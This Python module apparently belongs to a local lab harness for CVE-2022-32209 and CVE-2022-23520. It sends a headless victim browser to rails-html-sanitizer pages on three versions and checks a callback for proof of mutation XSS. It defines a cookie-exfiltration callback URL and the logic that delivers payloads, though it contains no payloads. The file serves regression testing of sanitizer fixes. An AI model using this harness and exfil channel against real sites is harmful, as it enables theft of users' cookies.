#!/usr/bin/env python3
"""Shared orchestration for the rails-html-sanitizer select+style mutation-XSS canary
(CVE-2022-32209 -> CVE-2022-23520).

One "probe" = (1) reset the callback, (2) drive the headless victim to view the sanitizer-sink page
`/?mode=<san_mode>&html=<payload>` on a version, (3) read the callback. The observable result is the
callback dump; the per-run ${PCB_FLAG} appears there IFF the sanitizer's output MUTATED in the
victim's browser into a live <img onerror>/<script> that executed (proving execution, not reflection).

`san_mode` selects the sanitizer API path the app uses:
  - "tags"  -> sanitize(html, tags: OVERRIDE)  (per-call :tags option; hit by the CVE-2022-32209 seed)
  - "class" -> sanitize(html) with class-level allowed_tags = OVERRIDE  (the CVE-2022-23520 residual path)

Same sink (Rails::Html::SafeListSanitizer#sanitize), same exfil channel for seed and residual; the
1.4.3 combination scrub is only wired into the "tags" branch -> the "class" branch is the residual.
The rails-html-sanitizer version differs per env (v0/v1/v2) -- that is the guard.
"""
import urllib.parse
import urllib.request

# Host-published ports (oracle / PoCs run on the host).
HOST_APP = {
    "v0": "http://127.0.0.1:34820",
    "v1": "http://127.0.0.1:34821",
    "v2": "http://127.0.0.1:34822",
}
# Internal compose URLs the victim browser uses (Docker DNS by service name).
INTERNAL_APP = {"v0": "http://v0", "v1": "http://v1", "v2": "http://v2"}
VICTIM = "http://127.0.0.1:34870"
CALLBACK = "http://127.0.0.1:34890"

# Internal callback the exfil payload navigates to (protocol-relative -> resolves to http on the
# victim page). The flag rides along as document.cookie.
CB = "//callback:9000/c?f="


def _get(url, timeout=120):
    with urllib.request.urlopen(url, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")


def run_payload(html_payload: str, version: str, san_mode: str = "class", visit_mode: str = "load") -> str:
    """Drive the victim to view the sink page with `html_payload` sanitized on `version` under
    `san_mode` (class|tags); return the callback dump (flag lands there iff the sanitized markup
    mutated + executed)."""
    _get(CALLBACK + "/reset")
    q_app = urllib.parse.urlencode({"mode": san_mode, "html": html_payload})
    target = INTERNAL_APP[version] + "/?" + q_app
    q = urllib.parse.urlencode(
        {"target": target, "origin": INTERNAL_APP[version] + "/", "mode": visit_mode}
    )
    _get(VICTIM + "/visit?" + q)
    return _get(CALLBACK + "/dump")


def server_side_render(html_payload: str, version: str, san_mode: str = "class") -> str:
    """Return the exact server-side sanitizer output (via /raw) for the repro log -- server proof."""
    q = urllib.parse.urlencode({"mode": san_mode, "html": html_payload})
    return _get(HOST_APP[version] + "/raw?" + q)

import os as _pcb_os
_pt = _pcb_os.environ.get("PCB_TARGET_PORT")
if _pt and str(_pt).isdigit():
    for _v in HOST_APP:
        HOST_APP[_v] = f"http://127.0.0.1:{int(_pt)}"
_ptv = _pcb_os.environ.get("PCB_VICTIM_PORT")
if _ptv and str(_ptv).isdigit():
    VICTIM = "http://127.0.0.1:" + _ptv
_ptc = _pcb_os.environ.get("PCB_CALLBACK_PORT")
if _ptc and str(_ptc).isdigit():
    CALLBACK = "http://127.0.0.1:" + _ptc
